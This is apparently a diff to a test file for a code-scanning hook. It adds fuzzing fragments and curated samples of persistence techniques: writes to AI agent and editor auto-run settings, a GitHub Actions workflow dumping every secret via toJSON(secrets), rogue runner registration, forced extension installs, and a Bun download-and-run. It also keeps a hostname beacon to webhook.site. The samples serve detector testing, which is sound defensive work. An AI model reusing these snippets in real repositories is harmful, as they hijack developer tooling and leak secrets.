@@ -357,6 +357,39 @@ PROSE_CURATED = [
     'x = 1\n"""\nrequests.post("https://webhook.site/0", data=socket.gethostname())\n"""\n',
     'x = \\\n"""requests.post("https://webhook.site/0", data=socket.gethostname())"""\n',
 ]
+# persistence targets (0.1.7): an agent's or editor's auto-run settings, a
+# workflow, an editor extension, a runner, the Bun loader, a secrets dump —
+# their paths whole and split, the writes, and the words around them
+PERSIST = ["\n", "\n", " ", "  ", "\t", "'", '"', "`", ", ", " + ", " / ", "/", "\\", "(", ")", ";", "|", "&", "=",
+           ".claude/settings.json", ".claude/settings.local.json", ".gemini\\settings.json", ".vscode/tasks.json",
+           ".vscode/mcp.json", ".cursor/hooks.json", ".cursor/mcp.json", ".mcp.json", ".claude.json", "x.mcp.json",
+           ".claude/settings.jsonc", "'.claude'", "'settings.json'", '".vscode"', '"tasks.json"', "`.cursor`",
+           "'hooks.json'", "'mcp.json'", "'.gemini'", "'settings.local.json'", "'.github'", "'workflows'",
+           ".github/workflows/x.yml", ".github\\workflows", "/contents/", "~/.vscode/extensions/x", "'.cursor'",
+           "'extensions'", "/.vscode-server/extensions", "fs.writeFileSync(", "writeFile(", "outputJson(p, ",
+           "json.dump(c, ", "open(p, 'w')", "open(p, \"ab+\")", "shutil.copy(", ".write_text(", "cpSync(",
+           "createOrUpdateFileContents(", " > ", " >> ", "tee ", "cp -r ", "mv ", "Set-Content -Path ", "git add ",
+           "git commit", "code --install-extension ", "cursor.cmd --install-extension x", "--install-extension",
+           "sudo code --install-extension a.vsix", "execSync(", "subprocess.run([", "console.log(",
+           "./config.sh --url https://github.invalid/o/r --token T", "config.cmd", "--token", "actions-runner-osx-arm64-2.3.tar.gz",
+           "actions/runner/releases", "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/x.zip",
+           "OVEN-SH/BUN/RELEASES", "oven-\u017fh/bun/relea\u017fes", "execFileSync(b, [s])", "${{ toJSON(secrets) }}",
+           "toJson( secrets )", "TOJSON(SECRETS)", "to\u212aJSON", "\u00e9", "\U0001F600", "\u2028", "\x85"]
+PERSIST_CURATED = [
+    "const p = path.join(os.homedir(), '.claude', 'settings.json');\nfs.writeFileSync(p, s);",
+    "fs.writeFileSync(`${home}/.claude/settings.local.json`, s)", "echo \"$HOOKS\" > .cursor/hooks.json",
+    "p = Path.home() / '.gemini' / 'settings.json'\nwith open(p, 'w') as f:\n    f.write(s)",
+    "const d = '.vscode' + '/'; x('.vscode', 'tasks.json'); fs.writeFileSync(a, b)",
+    "console.log('see .vscode/tasks.json')", "fs.writeFileSync(a, b); x('.vscode', 'settings.json')",
+    "git add .github/workflows/x.yml && git commit -m x",
+    "await put(`/repos/${o}/${r}/contents/.github/workflows/w.yml`, body)",
+    "const y = 'on: push\\njobs:\\n  a:\\n    env:\\n      D: ${{ toJSON(secrets) }}';\nfs.writeFileSync('.github/workflows/f.yml', y);",
+    "code --install-extension ./x.vsix", "execSync(`${cli} --install-extension ${vsix} --force`)",
+    "console.log('run: code --install-extension foo')", "cp -r ext ~/.vscode-server/extensions/",
+    "./config.sh --url https://github.invalid/o/r --token T --unattended --name r1 && nohup ./run.sh &",
+    "const url = `https://github.com/oven-sh/bun/releases/download/bun-v${V}/${asset}.zip`;\nexecFileSync(binPath, [entry]);\n",
+    "const w = '.github/workflows/x.yml';\nconst y = `env:\\n  D: ${{ toJSON(secrets) }}`;\n",
+]
 SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
            "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
            "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
@@ -370,10 +403,10 @@ def corpus(seed=20260926, scale=1):
     character they encode (a Python str could keep the two apart, a
     JavaScript string cannot)."""
     rnd = random.Random(seed)
-    cases = list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED
+    cases = list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
-                                (SELF, 1500, 14)):
+                                (SELF, 1500, 14), (PERSIST, 2500, 10)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
@@ -463,19 +496,24 @@ class HookParityTests(unittest.TestCase):
         # without Python, a beacon to a capture service; several share the install-script text), the
         # targets, shlex, node -e and completeness counters, and 3 #! languages
         # and the cases where reading a file without its prose (import_time_risk with a language)
-        # changes the answer, for Python and for JavaScript, and code read back from the file itself
-        self.assertEqual(len(counts), 28, counts)
+        # changes the answer, for Python and for JavaScript, and code read back from the file itself;
+        # and the 6 persistence reasons (0.1.7)
+        self.assertEqual(len(counts), 34, counts)
         # these reasons are rarer in the random stream but present (curated) and well above zero
         rare = {"not followed completely", "deserializes data it receives over the network",
                 "loads a module named by data it receives over the network", "downloads a file and then runs it",
                 "downloads a script and runs it with Python", "runs an encoded PowerShell command",
                 "runs an encoded PowerShell command that downloads and runs code",
-                "runs PowerShell that downloads and runs code"}
+                "runs PowerShell that downloads and runs code",
+                "carries a GitHub Actions workflow that dumps every repository secret",
+                "downloads the Bun runtime from GitHub and runs code with it"}
         self.assertEqual({k: n for k, n in counts.items() if n < 100 and k not in rare}, {}, counts)
         self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
         self.assertGreaterEqual(counts["deserializes data it receives over the network"], 25, counts)
         self.assertGreaterEqual(counts["loads a module named by data it receives over the network"], 25, counts)
         self.assertGreaterEqual(counts["downloads a file and then runs it"], 4, counts)
+        self.assertGreaterEqual(counts["carries a GitHub Actions workflow that dumps every repository secret"], 30, counts)
+        self.assertGreaterEqual(counts["downloads the Bun runtime from GitHub and runs code with it"], 30, counts)
 
     def test_pattern_text_and_names_are_cores(self):
         """The JS module carries core's pattern text verbatim, with the same
@@ -499,10 +537,10 @@ class HookParityTests(unittest.TestCase):
                                                  "_PS_ENCODED_MAX", "_STAGER_MIN", "_STAGER_MAX_LITERALS",
                                                  "_PS_EXEC_BACK", "_PS_EXEC_MAX_NAMES", "_SELF_READ_PASSES",
                                                  "_SELF_READ_MAX_CALLS", "_SELF_READ_ARG_SPAN", "_SELF_READ_MAX_ASSIGNS",
-                                                 "_LITERAL_SPANS_MAX")})
-        self.assertEqual(len(self.twins["patterns"]), 79)
+                                                 "_LITERAL_SPANS_MAX", "_PERSIST_MAX_LINES")})
+        self.assertEqual(len(self.twins["patterns"]), 92)
         self.assertEqual(len(self.twins["sets"]), 27)
-        self.assertEqual(len(self.twins["maps"]), 3)
+        self.assertEqual(len(self.twins["maps"]), 4)
 
 if __name__ == "__main__":
     unittest.main()
